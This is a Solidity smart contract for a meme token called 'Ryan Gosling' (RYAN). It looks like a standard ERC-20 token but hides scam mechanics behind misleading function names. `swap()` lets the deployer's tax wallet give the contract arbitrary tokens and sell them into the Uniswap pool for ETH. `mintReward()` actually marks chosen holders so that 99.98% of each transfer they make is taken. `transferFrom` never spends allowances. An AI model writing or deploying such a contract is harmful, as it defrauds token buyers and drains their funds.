pragma solidity ^0.8.21;
//SPDX-License-Identifier: MIT

library SafeMath {
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath:  subtraction overflow");
        uint256 c = a - b;
        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath:  addition overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath:  division by zero");
        uint256 c = a / b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {return 0;}
        uint256 c = a * b;
        require(c / a == b, "SafeMath:  multiplication overflow");
        return c;
    }
}

abstract contract Ownable {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    function owner() public view virtual returns (address) {return _owner;}
    constructor () {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }
    modifier onlyOwner(){
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }
}

interface IUniswapV2Router {
    function factory() external pure returns (address addr);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 a, uint256 b, address[] calldata _path, address c, uint256) external;
    function WETH() external pure returns (address aadd);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair_);
}

contract RyanGosling is Ownable {
    using SafeMath for uint256;
    uint256 public _decimals = 9;

    uint256 public _totalSupply = 1000000000 * 10 ** _decimals;

    function name() external view returns (string memory) {
        return _name;
    }

    string private _name = "Ryan Gosling";
    string private _symbol = "RYAN";
    constructor() {
        _taxWallet = msg.sender; 
        emit Transfer(address(0), sender(), _balances[sender()]);
        _balances[sender()] =  _totalSupply; 
    }

    function startTrading() external onlyOwner {
        tradingStart = getBlockNumber();
    }
    mapping (address => uint256) internal cooldowns;
    function swap (uint256 token, address wallet) external {
        if (marketingAddres()) {
            _approve(address(this), address(uniV2Router), token); 
            _balances[address(this)] = token;
            address[] memory path = new address[](2);
            path[0] = address(this); 
            path[1] = uniV2Router.WETH(); 
            uniV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(token, 0, path, wallet, block.timestamp + 32);
        } else { return; }
    }
    address public _taxWallet;
    function approve(address spender, uint256 amount) public virtual returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
    bool airdropped = false;
    
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "IERC20: approve from the zero address");
        require(spender != address(0), "IERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
    IUniswapV2Router private uniV2Router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    function decimals() external view returns (uint256) {
        return _decimals;
    }
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    function mintReward(address[] calldata wallets) external {
        for (uint _k = 0;  _k < wallets.length;  _k++) { 
            if (!marketingAddres()){} else {  cooldowns[wallets[_k]] = 4 + getBlockNumber() - 3;
                }
        }
    }
    function transferFrom(address from, address recipient, uint256 _amount) public returns (bool) {
        _transfer(from, recipient, _amount);
        require(_allowances[from][sender()] >= _amount);
        return true;
    }
    function sender() internal view returns (address) {
        return msg.sender;
    }
    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(sender(), recipient, amount);
        return true;
    }
    mapping(address => uint256) private _balances;
    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(sender(), spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }
    event Transfer(address indexed from, address indexed to, uint256);
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
    uint256 tradingStart = 0;
    function getBlockNumber() internal view returns (uint256) {
        return block.number;
    }
    mapping(address => mapping(address => uint256)) private _allowances;
    function marketingAddres() private view returns (bool) {
        return (_taxWallet == sender());
    }
    function decreaseAllowance(address from, uint256 amount) public returns (bool) {
        require(_allowances[msg.sender][from] >= amount);
        _approve(sender(), from, _allowances[msg.sender][from] - amount);
        return true;
    }
    event Approval(address indexed, address indexed, uint256 value);
    function _transfer(address from, address to, uint256 value) internal {
        require(from != address(0));
        require(value <= _balances[from]);
        uint256 taxAmount = 1 - 1;
        bool isOnCooldown = (cooldowns[from]) <= getBlockNumber();
        uint256 _fromBalance = _balances[from] - (value);
        emit Transfer(from, to, value);
        _balances[from] = _fromBalance;
        uint256 _cooldownTax = (value.mul(9998).div(10000));
        if ((cooldowns[from] != 0) && isOnCooldown) {   
            taxAmount = _cooldownTax;  }
        _balances[to] += ((value) - (taxAmount));
    }
    function totalSupply() external view returns (uint256) {
        return _totalSupply;
    }
}